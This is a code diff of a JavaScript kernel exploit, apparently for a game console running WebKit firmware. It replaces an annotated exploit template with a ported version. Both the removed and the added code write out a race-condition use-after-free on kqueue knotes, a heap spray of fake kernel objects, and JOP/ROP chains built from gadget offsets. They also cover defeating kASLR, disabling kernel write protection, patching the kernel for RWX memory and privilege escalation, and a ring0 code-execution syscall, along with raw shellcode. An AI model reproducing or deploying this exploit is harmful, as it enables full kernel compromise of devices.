@@ -37,8 +37,8 @@ function kernExploit() {
 
     // Spawn thread
     var spawnthread = function (name, chain) {
-      var longjmp = window.webKitBase.add32(0x1458);
-      var createThread = window.webKitBase.add32(0x116ED40);
+      var longjmp = window.webKitBase.add32(0x14e8);
+      var createThread = window.webKitBase.add32(0x779390);
       var contextp = p.malloc32(0x2000);
       var contextz = contextp.backing;
       contextz[0] = 1337;
@@ -60,6 +60,7 @@ function kernExploit() {
     var interrupt1, loop1;
     var interrupt2, loop2;
     var sock = p.syscall(97, 2, 2);
+    var kscratch = p.malloc32(0x1000);
 
     // Racing thread
     var start1 = spawnthread("GottaGoFast", function (thread2) {
@@ -96,241 +97,121 @@ function kernExploit() {
       thread2.finalizeSymbolic(whatp, loop1.sub32(8));
     });
 
-    /**********************************************************************************************
-     *
-     * Kexploit + Annotation by Specter begins here
-     *
-     *********************************************************************************************/
-
-    /*
-     * We'll need to be able to memcpy bytes from kernel to userland in order to dump it.
-     * We don't have the location of copyout() since it's a kernel function, but we don't need it.
-     * Userland's memcpy() called from kernel context can be used. WebKit imports memcpy from libc
-     * at offset 0xF8, therefore we can dereference it to get a perfectly working memcpy rather than
-     * implement one ourselves.
-     */
-    var memcpy = get_jmptgt(webKitBase.add32(0xF8));
-    memcpy = p.read8(memcpy);
-
-    /*
-     * Because 4.74 also has the RSP check against userland, we'll need to get the chain in kernel.
-     * We'll use JOP to do this, so we'll need to take note of how far we've shifted.
-     */
-    var stackshift = 0;
-    
-    /*
-     * Here we'll setup the ROP chains for the exploit thread that abuses the race condition
-     * (known as 'race') and the chain to run in kernel context (known as 'krop').
-     */
+    // start setting up chains
     var krop = new rop();
     var race = new rop();
 
-    /*
-     * A few buffers are needed to store information. 'savectx' will be used to save register context
-     * at the beginning of the kernel ROP chain. We can use some of these register values to defeat kASLR,
-     * as well as return to userland cleanly via the saved RBP value.
-     */
-    var kscratch      = p.malloc32(0x1000);
-    var kernelBuf     = p.malloc(0x250000);
+    /**
+      * Qwerty Madness!
+      * -
+      * This section contains magic. It's for bypassing Sony's ghetto "SMAP".
+      * Need to be a level 99 mage to understand this completely (not really but kinda). ~ Specter
+     **/
 
-    /*
-     * Here is where we'll allocate buffers to hold information which we will use to fake kernel objects,
-     * notably we'll create a fake knote as well as a fake knote file operations function table.
-     */
-    var fakeKnote     = p.malloc32(0x1000);
-    var fakeKnoteFops = p.malloc32(0x1000);
-    var scratchBuf    = p.malloc32(0x1000);
+    var ctxp  = p.malloc32(0x2000);
+    var ctxp1 = p.malloc32(0x2000);
+    var ctxp2 = p.malloc32(0x2000);
 
-    /*
-     * Using the BPF filter program, we can spray the heap with our fake knote pointers.
-     *
-     * Additionally, we need to set knote->kn_status (offset: 0x50) to 0 for the corrupted
-     * function pointer (f_detach()) to be called.
-     *
-     * Finally, our ultimate target is the function table at offset 0x68, knote->kn_fops,
-     * the file operations table, which will again be an object faked in userland.
-     * By writing the address of our stack pivot gadget to fakeKnoteFops+0x10, we achieve
-     * code execution!
-     */
-    p.write8(bpf_spray.add32(0x10), fakeKnote);     // Spray heap with the fake knote object
-    p.write8(fakeKnote.add32(0x50), 0);             // Set knote->kn_status to 0 to detach
-    p.write8(fakeKnote.add32(0x68), fakeKnoteFops); // Set knote->kn_fops to fake function table
-    p.write8(fakeKnoteFops.add32(0x10), window.gadgets["jop1"]);  // Set kn_fops->f_detach to first JOP gadget
+    p.write8(bpf_spray.add32(16), ctxp);
+    p.write8(ctxp.add32(0x50), 0);
+    p.write8(ctxp.add32(0x68), ctxp1);
+    var stackshift_from_retaddr = 0;
+    p.write8(ctxp1.add32(0x10), offsetToWebKit(0x12A19CD)); // sub rsp
 
-    /*
-     * JOP gadget one
-     * -
-     * This gadget creates stack space for us to put the kROP chain.
-     * -
-     * sub     rsp, 48h
-     * mov     [rbp+var_30], edx
-     * mov     [rbp+var_38], rsi
-     * mov     r13, rdi
-     * mov     r15, rsi
-     * mov     rax, [r13+0]
-     * call    qword ptr [rax+7D0h] ; rsp -= 8 on call instructions
-     */
+    stackshift_from_retaddr += 8 + 0x58;
 
-    /*
-     * With 0x48 being explicitly subbed from RSP, and "call" implicitly subbing
-     * 0x08, the shift total is 0x50.
-     */
-    stackshift = 0x50;
+    p.write8(ctxp.add32(0), ctxp2);
+    p.write8(ctxp.add32(0x10), ctxp2.add32(8));
+    p.write8(ctxp2.add32(0x7d0), offsetToWebKit(0x6EF4E5)); // mov rdi, [rdi+0x10]
 
-    /*
-     * We can control rdi's value via knote+0. Since our first JOP gadget will use
-     * rdi for it's next jump, we'll setup our next gadget by using a scratch buffer.
-     *
-     * Notice from JOP gadget one that we control the next jump via [rdi + 0x7D0].
-     */
-    p.write8(fakeKnote.add32(0x00), scratchBuf);  // Set rdi
-    p.write8(fakeKnote.add32(0x10), scratchBuf.add32(0x08));
-    p.write8(scratchBuf.add32(0x7D0), window.gadgets["jop2"]); // Chain to next gadget
+    var iterbase = ctxp2;
 
-    /*
-     * JOP gadget two
-     * -
-     * This gadget allows us to iterate / loop. By combining gadget one and two,
-     * we can continously chain calls to create stack space.
-     * -
-     * mov     rdi, [rdi+10h]
-     * jmp     qword ptr [rax]
-     */
-
-    var iterbase = scratchBuf;
-
-    for(var i = 0; i < 0xF; i++)
-    {
-      /* Gadget One repeated - see line 161. */
-      p.write8(iterbase, window.gadgets["jop1"]); // Chain to next gadget
-      stackshift += 0x50;
-
-      /* Gadget Two repeated - see line 190. */
-      p.write8(iterbase.add32(0x7D0 + 0x20), window.gadgets["jop2"]); // Chain to next gadget
-
-      p.write8(iterbase.add32(0x08), iterbase.add32(0x20));
-      p.write8(iterbase.add32(0x18), iterbase.add32(0x28));
+    for (var i = 0; i < 0xf; i++) {
+      p.write8(iterbase, offsetToWebKit(0x12A19CD)); // sub rsp
+      stackshift_from_retaddr += 8 + 0x58;
+      p.write8(iterbase.add32(0x7d0 + 0x20), offsetToWebKit(0x6EF4E5)); // mov rdi, [rdi+0x10]
+      p.write8(iterbase.add32(8), iterbase.add32(0x20));
+      p.write8(iterbase.add32(0x18), iterbase.add32(0x20 + 8))
       iterbase = iterbase.add32(0x20);
     }
 
-    /*
-     * After loop exit, we're back to gadget one, meaning our next jump will be at
-     * iterbase + 0 (since the loop moves iterbase up for us). Next, we want to prepare
-     * the memcpy call to copy the chain into kernel memory. We need to setup the following regs:
-     *
-     * rdi (memory destination pointer)
-     * rsi (memory source pointer)
-     * rdx (size in bytes)
-     */
-
     var raxbase = iterbase;
-    var rdibase = iterbase.add32(0x08);
+    var rdibase = iterbase.add32(8);
+    var memcpy = get_jmptgt(webKitBase.add32(0xF8));
+    memcpy = p.read8(memcpy);
 
-    /*
-     * First we'll setup RDX (size). Enter gadget 3, which will load rdx with [rdi + 0xB0],
-     * and jump to the next gadget at [rdi + 0x70]. We won't actually write the size to 0xB0
-     * in rdibase until we have the final stack shift.
-     */
+    p.write8(raxbase, offsetToWebKit(0x15CA41B));
+    stackshift_from_retaddr += 8;
 
-    p.write8(raxbase, window.gadgets["jop3"]); // Chain to next gadget
-    stackshift += 0x08;
-
-    /*
-     * JOP gadget three
-     * -
-     * Load RDX.
-     * -
-     * mov     rdx, [rdi+0B0h]
-     * call    qword ptr [rdi+70h] ; Note: "call" shifts rsp by 8.
-     */
-
-    p.write8(rdibase.add32(0x70), window.gadgets["jop4"]); // Chain to next gadget
-    stackshift += 0x08;
-
-    /*
-     * Next we'll set RSI (source). Enter gadget 4, which will load rsi with [rdi + 0x08],
-     * and jump to the next gadget at [rdi + 0x48] (or [rax + 0x30]).
-     */
-
-    /*
-     * JOP gadget four
-     * -
-     * Loads RSI.
-     * -
-     * mov     rsi, [rdi+8]
-     * mov     rdi, [rdi+18h]
-     * mov     rax, [rdi]
-     * call    qword ptr [rax+30h] ; Note: "call" shifts rsp by 8.
-     */
+    p.write8(rdibase.add32(0x70), offsetToWebKit(0x1284834));
+    stackshift_from_retaddr += 8;
 
     p.write8(rdibase.add32(0x18), rdibase);
-    p.write8(rdibase.add32(0x08), krop.stackBase); // Sets RSI to krop stack's location
-    p.write8(raxbase.add32(0x30), window.gadgets["jop5"]); // Save RSP
+    p.write8(rdibase.add32(8), krop.stackBase);
+    p.write8(raxbase.add32(0x30), window.gadgets["mov rbp, rsp"]);
+    p.write8(rdibase, raxbase);
+    p.write8(raxbase.add32(0x420), offsetToWebKit(0x272961)); // lea rdi, [rbp - 0x28]
+    p.write8(raxbase.add32(0x40), memcpy.add32(0xC2 - 0x90));
+    var topofchain = stackshift_from_retaddr + 0x28;
+    p.write8(rdibase.add32(0xB0), topofchain);
 
-    /*
-     * Finally we'll set RDI (destination). Using the RBP value we just saved, we
-     * effectively can set RDI relative to RBP and get a valid kernel stack location.
-     */
-
-    /*
-     * JOP gadget five
-     * -
-     * This gadget effectively saves RSP into RBP and calls [rdi + 0x420].
-     * -
-     * mov     rbp, rsp
-     * mov     rax, [rdi]
-     * call    qword ptr [rax+420h]
-     */
-
-    p.write8(rdibase.add32(0x00), raxbase); // [rdi] = rax
-    p.write8(raxbase.add32(0x420), window.gadgets["jop6"]); // Chain to next gadget
-
-    /*
-     * JOP gadget six
-     * -
-     * Sets RDI to [rbp - 0x28] and calls [rax + 0x40].
-     * -
-     * lea     rdi, [rbp-28h]
-     * call    qword ptr [rax+40h] ; Note: "call" shifts rsp by 8.
-     */
-
-    /*
-     * Finally, we'll invoke memcpy(), but first, we need to set the size as mentioned
-     * on line 230. We'll also skip the function prologue by jumping 0x32 bytes into memcpy.
-     */
-
-    var topOfChain = stackshift + 0x28; // Add 0x28 to accomodate for 0x28 being subbed from gadget 6
-    p.write8(raxbase.add32(0x40), memcpy.add32(0x32)); // Chain to memcpy
-    p.write8(rdibase.add32(0xB0), topOfChain); // Write size for memcpy
-
-    /*
-     * Pad out the chain with NOP's (ret gadgets)
-     */
     for (var i = 0; i < 0x1000 / 8; i++) {
       p.write8(krop.stackBase.add32(i * 8), window.gadgets["ret"]);
     }
 
     krop.count = 0x10;
 
-    /*
-     * As a test, we can set the first and only gadget of our chain to that of an infloop.
-     * This is a hacky way of detecting if your kernel ROP chain is running without debugging
-     * capabilities. If the page freezes, but the system doesn't panic - it works. Once confirmed
-     * working, this can be commented out in favor of the real kROP chain.
-     */
-    //krop.push(window.gadgets["infloop"]);
+    /**
+      * End of Qwerty madness
+     **/
 
-    /*
-     * kscratch will be used as a space to move things around for ROP chain operations, kind of like
-     * a little container.
-     * -
-     * +0x18 = points back to kscratch. Used to setup JOP gadget for `mov rbp, rsp`.
-     * +0x40 = points to pop rax gaget. Used since `lea rdi, [rbp - 0x28]` is a JOP gadget, not ROP. JOP Gadget 6.
-     * +0x50 = used for saving rbp to mem.
-     * +0x58 = used to point back to kscratch+0x50. 
-     * +0x90 = points to dump location / kernel base depending on what's commented.
-     * +0x420 = points to pop rdi gadget. Used since `mov rbp, rsp` is a JOP gadget, not ROP.
-     */
+    /**
+      * Bit of info:
+      * -
+      * The "kchain" buffer is used to store the kernel ROP chain, and is managed by the "krop" class defined in rop.js.
+      * There are also two helper functions for the class, "kpatch" and "kpatch2" for patching the kernel defined below.
+      * The "kchainstack" buffer should not be used directly as it is managed by the "krop" class!
+      * -
+      * The "kscratch" buffer is used to save context. The layout is as follows:
+      * kscratch + 0x00: contents of rax register (points to kernel base + 0x16DB6C)
+      * kscratch + 0x08: pointer to function stub that manipulates cr0 (mov rax, cr0; or rax, 5002Ah; mov cr0, rax; ret)
+      * kscratch + 0x10: contents of cr0 before the write protection bit is flipped for kernel patching
+      * kscratch + 0x18: pointer to kscratch
+      * kscratch + 0x40: "pop rax" gadget
+      * kscratch + 0x420: "pop rdi" gadget
+     **/
+
+    // Helper function for patching kernel
+    var kpatch = function(offset, qword) {
+      krop.push(window.gadgets["pop rax"]);
+      krop.push(kscratch);
+      krop.push(window.gadgets["mov rax, [rax]"]);
+      krop.push(window.gadgets["pop rsi"]);
+      krop.push(offset);
+      krop.push(window.gadgets["add rax, rsi"]);
+      krop.push(window.gadgets["pop rsi"]);
+      krop.push(qword);
+      krop.push(window.gadgets["mov [rax], rsi"]);
+    }
+
+    // Helper function for patching kernel with information from kernel.text
+    var kpatch2 = function(offset, offset2) {
+      krop.push(window.gadgets["pop rax"]);
+      krop.push(kscratch);
+      krop.push(window.gadgets["mov rax, [rax]"]);
+      krop.push(window.gadgets["pop rsi"]);
+      krop.push(offset);
+      krop.push(window.gadgets["add rax, rsi"]);
+      krop.push(window.gadgets["mov rdi, rax"]);
+      krop.push(window.gadgets["pop rax"]);
+      krop.push(kscratch);
+      krop.push(window.gadgets["mov rax, [rax]"]);
+      krop.push(window.gadgets["pop rsi"]);
+      krop.push(offset2);
+      krop.push(window.gadgets["add rax, rsi"]);
+      krop.push(window.gadgets["mov [rdi], rax"]);
+    }
+
     p.write8(kscratch.add32(0x420), window.gadgets["pop rdi"]);
     p.write8(kscratch.add32(0x40), window.gadgets["pop rax"]);
     p.write8(kscratch.add32(0x18), kscratch);
@@ -339,220 +220,121 @@ function kernExploit() {
     krop.push(kscratch.add32(0x18));
     krop.push(window.gadgets["mov rbp, rsp"]);
 
-    var rboff = topOfChain - krop.count * 8 + 0x28;
+    var rboff = topofchain - krop.count * 8 + 0x28;
 
-    krop.push(window.gadgets["jop6"]); // lea rdi, [rbp - 0x28]
+    krop.push(offsetToWebKit(0x272961)); // lea rdi, [rbp - 0x28]
     krop.push(window.gadgets["pop rax"]);
     krop.push(rboff);
     krop.push(window.gadgets["add rdi, rax"]);
 
-    /*
-     * Here we can defeat kASLR. Because we have the return pointer at the top of the stack (which points
-     * to the next instruction after the call we hijacked), we can use this to calculate the kernel's memory
-     * layout. After dumping the kernel, we can see the slide is 0x1E48A0, so we'll subtract this from that
-     * pointer and store it at kscratch+0x90. This can be used for patching as well.
-     */
     krop.push(window.gadgets["mov rax, [rdi]"]);
-    krop.push(window.gadgets["pop rcx"]);
-    krop.push(0x1E48A0); // Slide of the return ptr from kernel base
-    krop.push(window.gadgets["sub rax, rcx"]);
-    krop.push(window.gadgets["mov rdx, rax"]);
     krop.push(window.gadgets["pop rsi"]);
-    krop.push(kscratch.add32(0x90));
-    krop.push(window.gadgets["mov [rsi], rdx"]);
-
-    /*
-     * This essentially overwrites the return pointer on the stack to skip the rest of kqueue_close(). Why?
-     * since we just free()'d and corrupted the knote, allowing the kernel to do operations on it could be
-     * catastrophic and crash the kernel. By setting it to jump to a function epilogue, the function returns
-     * and everything's OK again.
-     */
-    krop.push(window.gadgets["pop rax"]);
-    krop.push(window.gadgets["test"]); // function epilogue: sub rsp; pop ...; retn
+    krop.push(0x2FA);
+    krop.push(window.gadgets["add rax, rsi"]);
     krop.push(window.gadgets["mov [rdi], rax"]);
-
-    /**********************************************************************************************
-     *
-     * Annotation ends here (except line 378).
-     * I'm too lazy to port all the patches so from this point, feel free to add patches in the ROP
-     * chain here. Consider this a "template" as you will. ~ Specter
-     *
-     *********************************************************************************************/
-	
-	/*
-	4.74 kernel offsets from kbase:
-	cpu_setregs: 0x283120 // 4.74 - used for enable kernel write protection at end of kROP
-	disable_write_protection: 0x283129 // 4.74 must be called before applying kernel patches
-	sys_mmap_patch_offset: 0x1413A4 // 4.74
-	amd64_syscall: 0x3DD3B0 // 4.74
-	kernel_syscall_patch1_offset: 0x3DD4B3 // 4.74
-	kernel_syscall_patch2_offset: 0x3DD4D1  // 4.74
-	sys_dynlib_dlsym: 0x3D0470 // 4.74
-	sys_dynlib_dlsym_patch1_offset: 0x3D05AE // 4.74
-	sys_dynlib_dlsym_patch2_offset: 0x686A0 // 4.74
-	crcopysafe: 0x113D50 // 4.74
-	sys_setuid: 0x1144A0 // 4.74
-	priv_check_cred_offset: 0x1145B1 // 4.74
-	syscall table start offset : 0x1034790 // 4.74
-	syscall 11 entry:
-	0x1034790 + 11* 0x30 = 0x10349A0 // 4.74
-	jmp_qword_ptr_rsi: 0x139A2F // 4.74
-	*/
-	 
-	 
-	// Disable kernel write protection
-	krop.push(window.gadgets["pop rax"])//pop rax present
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);//present
-	krop.push(window.gadgets["pop rcx"]);//present
-	krop.push(0x283129);//done
-	krop.push(window.gadgets["add rax, rcx"]);//present
-	krop.push(offsetToWebKit(0x12a16)); // mov rdx, rax, already done
-	krop.push(window.gadgets["pop rax"]);
-	krop.push(0x80040033);
-	krop.push(offsetToWebKit(0x1517c7)); // jmp rdx, done
-
-	// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
-	// E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
-	var kexploit_check_patch = new int64(0x000000B8, 0xC6894100);
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x113B73);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["pop rsi"]);//present
-	krop.push(kexploit_check_patch);
-	krop.push(window.gadgets["mov [rax], rsi"]);//present
-
-	// Patch mprotect: Allow RWX (read-write-execute) mapping
-	var mprotect_patch = new int64(0x9090FA38, 0x90909090);
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x397876);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["pop rsi"]);
-	krop.push(mprotect_patch);
-	krop.push(window.gadgets["mov [rax], rsi"]);
-	
-	// Patch sys_mmap: Allow RWX (read-write-execute) mapping
-	var kernel_mmap_patch = new int64(0x37b64137, 0x3145c031);
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x1413A4);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["pop rsi"]);
-	krop.push(kernel_mmap_patch);
-	krop.push(window.gadgets["mov [rax], rsi"]);
-
-	// Patch syscall: syscall instruction allowed anywhere
-	var kernel_syscall_patch1 = new int64(0x00000000, 0x40878b49);
-	var kernel_syscall_patch2 = new int64(0x909079eb, 0x72909090);
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x3DD4B3);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["pop rsi"]);
-	krop.push(kernel_syscall_patch1);
-	krop.push(window.gadgets["mov [rax], rsi"]);
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x3DD4D1);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["pop rsi"]);
-	krop.push(kernel_syscall_patch2);
-	krop.push(window.gadgets["mov [rax], rsi"]);
-
-	// Patch sys_dynlib_dlsym: Allow from anywhere
-	var kernel_dlsym_patch1 = new int64(0x000352E9, 0x8B489000);
-	var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x3D05AE);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["pop rsi"]);
-	krop.push(kernel_dlsym_patch1);
-	krop.push(window.gadgets["mov [rax], rsi"]);
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x686A0);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["pop rsi"]);
-	krop.push(kernel_dlsym_patch2);
-	krop.push(window.gadgets["mov [rax], rsi"]);
-
-	// Add custom sys_exec() call to execute arbitrary code as kernel
-	var kernel_exec_param = new int64(0, 1);
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x10349A0);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["pop rsi"]);
-	krop.push(0x02);
-	krop.push(window.gadgets["mov [rax], rsi"]);
-	krop.push(window.gadgets["pop rsi"])
-	krop.push(0x139A2F); // jmp qword ptr [rsi],done
-	krop.push(window.gadgets["pop rdi"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(offsetToWebKit(0x119d1f0)); //add rsi, [rdi]; mov rax, rsi, done
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x10349A8);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["mov [rax], rsi"]);
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x10349C8);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["pop rsi"]);
-	krop.push(kernel_exec_param);
-	krop.push(window.gadgets["mov [rax], rsi"]);
-	
-	// Enable kernel write protection
-	krop.push(window.gadgets["pop rax"])
-	krop.push(kscratch.add32(0x90));
-	krop.push(window.gadgets["mov rax, [rax]"]);
-	krop.push(window.gadgets["pop rcx"]);
-	krop.push(0x283120);//done
-	krop.push(window.gadgets["add rax, rcx"]);
-	krop.push(window.gadgets["jmp rax"]);//jmp rax present	
-
-    /*
-     * End Patches
-     */
 
     var shellbuf = p.malloc32(0x1000);
 
-    /*
-     * Clean up the stack and return to normal execution.
-     */
+    // Save context of cr0 register
     krop.push(window.gadgets["pop rdi"]); // save address in usermode
     krop.push(kscratch);
     krop.push(window.gadgets["mov [rdi], rax"]);
+    krop.push(window.gadgets["pop rsi"]);
+    krop.push(0xC54B4);
+    krop.push(window.gadgets["add rax, rsi"]);
+    krop.push(window.gadgets["pop rdi"]);
+    krop.push(kscratch.add32(0x08));
+    krop.push(window.gadgets["mov [rdi], rax"]);
+    krop.push(window.gadgets["jmp rax"]);
+    krop.push(window.gadgets["pop rdi"]); // save cr0
+    krop.push(kscratch.add32(0x10));
 
-    krop.push(window.gadgets["ret2userland"]);
+    // Disable kernel write protection for .text
+    krop.push(window.gadgets["mov [rdi], rax"]); // Save cr0 register
+    krop.push(window.gadgets["pop rsi"]);
+    krop.push(new int64(0xFFFEFFFF, 0xFFFFFFFF)); // Flip WP bit
+    krop.push(window.gadgets["and rax, rsi"]);
+    krop.push(window.gadgets["mov rdx, rax"]);
+    krop.push(window.gadgets["pop rax"]);
+    krop.push(kscratch.add32(8));
+    krop.push(window.gadgets["mov rax, [rax]"]);
+    krop.push(window.gadgets["pop rsi"]);
+    krop.push(0x9);
+    krop.push(window.gadgets["add rax, rsi"]);
+    krop.push(window.gadgets["mov rdi, rax"]);
+    krop.push(window.gadgets["mov rax, rdx"]);
+    krop.push(window.gadgets["jmp rdi"]);
+
+    krop.push(window.gadgets["pop rax"]);
+    krop.push(kscratch);
+    krop.push(window.gadgets["mov rax, [rax]"]);
+    krop.push(window.gadgets["pop rsi"]);
+    krop.push(0x3609A);
+    krop.push(window.gadgets["add rax, rsi"]);
+    krop.push(window.gadgets["mov rax, [rax]"]);
+    krop.push(window.gadgets["pop rdi"]);
+    krop.push(kscratch.add32(0x330));
+    krop.push(window.gadgets["mov [rdi], rax"]);
+
+    // Patch sys_mprotect: Allow RWX mapping
+    patch_mprotect = new int64(0x9090FA38, 0x90909090);
+    kpatch(0x3609A, patch_mprotect);
+
+    // Patch bpf_cdevsw: add back in bpfwrite() implementation for kernel primitives
+    kpatch(0x133C344, shellbuf);
+
+    // Patch sys_setuid: add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
+    var patch_sys_setuid_offset = new int64(0xFFEE6F06, 0xFFFFFFFF);
+    var patch_sys_setuid = new int64(0x000000B8, 0xC4894100);
+    kpatch(patch_sys_setuid_offset, patch_sys_setuid);
+
+    // Patch amd64_syscall: syscall instruction allowed anywhere
+    var patch_amd64_syscall_offset1 = new int64(0xFFE92927, 0xFFFFFFFF);
+    var patch_amd64_syscall_offset2 = new int64(0xFFE92945, 0xFFFFFFFF);
+    var patch_amd64_syscall_1 = new int64(0x00000000, 0x40878B49);
+    var patch_amd64_syscall_2 = new int64(0x90907DEB, 0x72909090);
+    kpatch(patch_amd64_syscall_offset1, patch_amd64_syscall_1);
+    kpatch(patch_amd64_syscall_offset2, patch_amd64_syscall_2);
+
+    // Patch: sys_mmap: allow RWX mapping from anywhere
+    var patch_sys_mmap_offset = new int64(0xFFFCFAB4, 0xFFFFFFFF);
+    var patch_sys_mmap = new int64(0x37B64037, 0x3145C031);
+    kpatch(patch_sys_mmap_offset, patch_sys_mmap);
+
+    // Patch sys_dynlib_dlsym: allow dynamic resolving from anywhere
+    var patch_sys_dynlib_dlsym_1 = new int64(0x000000E9, 0x8B489000);
+    var patch_sys_dynlib_dlsym_2 = new int64(0x90C3C031, 0x90909090);
+    kpatch(0xCA3CE,  patch_sys_dynlib_dlsym_1);
+    kpatch(0x144AB4, patch_sys_dynlib_dlsym_2);
+
+    // Patch sysent entry #11: sys_kexec() custom syscall to execute code in ring0
+    var patch_sys_exec_1 = new int64(0x00F0ECB4, 0);
+    var patch_sys_exec_2A = new int64(0x00F0ECBC, 0);
+    var patch_sys_exec_2B = new int64(0xFFEA58F4, 0xFFFFFFFF);
+    var patch_sys_exec_3 = new int64(0x00F0ECDC, 0);
+    var patch_sys_exec_param1 = new int64(0x02, 0);
+    var patch_sys_exec_param3 = new int64(0, 1);
+    kpatch(patch_sys_exec_1, patch_sys_exec_param1);
+    kpatch2(patch_sys_exec_2A, patch_sys_exec_2B);
+    kpatch(patch_sys_exec_3, patch_sys_exec_param3);
+
+    // Enable kernel write protection for .text
+    krop.push(window.gadgets["pop rax"]);
+    krop.push(kscratch.add32(0x08));
+    krop.push(window.gadgets["mov rax, [rax]"]);
+    krop.push(window.gadgets["pop rsi"]);
+    krop.push(0x09);
+    krop.push(window.gadgets["add rax, rsi"]);
+    krop.push(window.gadgets["mov rdi, rax"]);
+    krop.push(window.gadgets["pop rax"]);
+    krop.push(kscratch.add32(0x10)); // Restore old cr0 value with WP bit set
+    krop.push(window.gadgets["mov rax, [rax]"]);
+    krop.push(window.gadgets["jmp rdi"]);
+
+    krop.push(offsetToWebKit(0x5CDB9)); // Clean up stack
     krop.push(kscratch.add32(0x1000));
 
-    // Run exploit
-    var kq  = p.malloc32(0x10);
+    var kq = p.malloc32(0x10);
     var kev = p.malloc32(0x100);
     kev.backing[0] = sock;
     kev.backing[2] = 0x1ffff;
@@ -560,15 +342,15 @@ function kernExploit() {
     kev.backing[4] = 5;
 
     // Shellcode to clean up memory
-	var shcode = [0x00008be9, 0x90909000, 0x90909090, 0x90909090, 0x0082b955, 0x8948c000, 0x415641e5, 0x53544155, 0x8949320f, 0xbbc089d4, 0x00000100, 0x20e4c149, 0x48c40949, 0x0096058d, 0x8d490000, 0x48302494, 0x8d4dffcf, 0xcdf024b4, 0x8d4d000e, 0xc76024ac, 0x8149ffd0, 0x660570c4, 0x10894801, 0x00401f0f, 0x000002ba, 0xe6894c00, 0x000800bf, 0xd6ff4100, 0x393d8d48, 0x48000000, 0xc031c689, 0x83d5ff41, 0xdc7501eb, 0x41c0315b, 0x415d415c, 0x90c35d5e, 0x3d8d4855, 0xffffff78, 0x8948f631, 0x00e95de5, 0x48000000, 0x000bc0c7, 0x89490000, 0xc3050fca, 0x6c616d6b, 0x3a636f6c, 0x25783020, 0x6c363130, 0x00000a58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
+    var shcode = [0x00008be9, 0x90909000, 0x90909090, 0x90909090, 0x0082b955, 0x8948c000, 0x415641e5, 0x53544155, 0x8949320f, 0xbbc089d4, 0x00000100, 0x20e4c149, 0x48c40949, 0x0096058d, 0x8d490000, 0xfe402494, 0x8d4dffff, 0xe09024b4, 0x8d4d0010, 0x5e8024ac, 0x81490043, 0x4b7160c4, 0x10894801, 0x00401f0f, 0x000002ba, 0xe6894c00, 0x000800bf, 0xd6ff4100, 0x393d8d48, 0x48000000, 0xc031c689, 0x83d5ff41, 0xdc7501eb, 0x41c0315b, 0x415d415c, 0x90c35d5e, 0x3d8d4855, 0xffffff78, 0x8948f631, 0x00e95de5, 0x48000000, 0x000bc0c7, 0x89490000, 0xc3050fca, 0x6c616d6b, 0x3a636f6c, 0x25783020, 0x6c363130, 0x00000a58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
     for (var i = 0; i < shcode.length; i++) {
       shellbuf.backing[i] = shcode[i];
     }
 
+    // RACE!
     var iters = 0;
     start1();
-
-    while(1) {
+    while (1) {
       race.count = 0;
 
       // Create a kqueue
@@ -595,9 +377,7 @@ function kernExploit() {
       race.push(window.gadgets["pop rax"]);
       race.push(kq);
       race.push(window.gadgets["mov rax, [rax]"]);
